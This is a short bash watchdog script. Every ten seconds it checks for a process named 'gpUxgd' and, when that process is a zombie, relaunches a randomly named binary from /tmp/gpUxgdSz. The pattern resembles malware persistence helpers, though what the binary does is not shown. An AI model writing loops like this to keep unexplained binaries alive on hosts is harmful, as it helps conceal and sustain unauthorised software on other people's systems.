#!/bin/bash


check_process_by_name() {
    local process_name=$1

    local pids=$(pgrep -f "$process_name")

    if [[ -n "$pids" ]]; then
        for pid in $pids; do

            local status=$(ps -o stat= -p $pid 2>/dev/null)

            if [[ "$status" != "Z" ]]; then
                echo "Process '$process_name' (PID: $pid) is running."
            else
	    	cd /tmp/gpUxgdSz
                ./gpUxgd
            fi
        done
 
    fi
}




while true; do
	check_process_by_name "gpUxgd"

	sleep 10
done

